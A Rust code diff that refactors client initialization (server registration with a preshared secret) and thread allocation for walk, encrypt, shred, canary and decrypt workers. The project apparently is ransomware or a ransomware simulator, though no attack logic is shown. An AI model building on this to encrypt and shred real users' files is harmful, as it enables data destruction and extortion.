@@ -1,23 +1,21 @@
 use log::{debug, error, warn};
 use std::{path::Path, thread::available_parallelism};
 
-use crate::comm::register;
-use crate::status::{create_status, export_status_csv, import_status_csv, Status};
+use crate::{
+    comm::register,
+    status::{Status, create_status, export_status_csv, import_status_csv},
+};
 
 pub fn initialize_client(
     exe_path_dir: &Path,
     server_fqdn: &str,
-    server_port: &u16,
+    server_port: u16,
     preshared_secret: &str,
-    https: &bool,
-    verify_server: &bool,
+    https: bool,
+    verify_server: bool,
 ) -> Status {
-    match import_status_csv(exe_path_dir) {
-        Some(csv_result) => {
-            debug!("Successully imported status: {:?}", csv_result);
-            csv_result
-        }
-        None => {
+    import_status_csv(exe_path_dir).map_or_else(
+        || {
             warn!("Existing status not imported");
             let new_status = create_status();
             register(
@@ -29,10 +27,14 @@ pub fn initialize_client(
                 verify_server,
             );
             export_status_csv(exe_path_dir, &new_status);
-            debug!("Created new status: {:?}", new_status);
+            debug!("Created new status: {new_status:?}");
             new_status
-        }
-    }
+        },
+        |csv| {
+            debug!("Successully imported status: {csv:?}");
+            csv
+        },
+    )
 }
 
 #[derive(Clone, Debug)]
@@ -47,37 +49,31 @@ pub struct ThreadNums {
 
 pub fn get_thread_nums() -> ThreadNums {
     let num_threads = match available_parallelism() {
-        Ok(suggested_threads_result) => {
-            debug!(
-                "Successfully got suggested number of threads: {}",
-                suggested_threads_result
-            );
-            suggested_threads_result.get()
+        Ok(suggested) => {
+            debug!("Successfully got suggested number of threads: {suggested}");
+            suggested.get()
         }
-        Err(suggested_threads_result) => {
-            error!(
-                "Failed to get suggested number of threads: {}",
-                suggested_threads_result
-            );
+        Err(error) => {
+            error!("Failed to get suggested number of threads: {error}");
             1
         }
     };
 
-    let num_walk_threads = (num_threads / 6).max(1);
-    debug!("Using {} walk threads", num_walk_threads);
-    let num_shred_threads = (num_threads / 6).max(1);
-    debug!("Using {} shred threads", num_shred_threads);
+    let num_walk_threads = 1; // zlob handles its own parallelism
     let num_canary_threads = (num_threads / 6).max(1);
-    debug!("Using {} canary threads", num_canary_threads);
-    let num_encrypt_threads = (num_threads - num_walk_threads - num_shred_threads).max(1);
-    debug!("Using {} encrypt threads", num_encrypt_threads);
-    let num_encrypt_threads_canary = (num_encrypt_threads - num_canary_threads).max(1);
-    debug!(
-        "Using {} encrypt threads if using canary filter",
-        num_encrypt_threads_canary
-    );
+    let num_shred_threads = (num_threads / 6).max(1);
+    let remaining = num_threads
+        .saturating_sub(num_walk_threads + num_canary_threads + num_shred_threads)
+        .max(1);
+    let num_encrypt_threads = remaining;
+    let num_encrypt_threads_canary = num_encrypt_threads
+        .saturating_sub(num_canary_threads)
+        .max(1);
     let num_decrypt_threads = (num_threads - num_walk_threads).max(1);
-    debug!("Using {} decrypt threads", num_decrypt_threads);
+
+    debug!(
+        "Using {num_walk_threads} walk, {num_canary_threads} canary, {num_encrypt_threads} encrypt, {num_shred_threads} shred"
+    );
 
     ThreadNums {
         walk_threads: num_walk_threads,
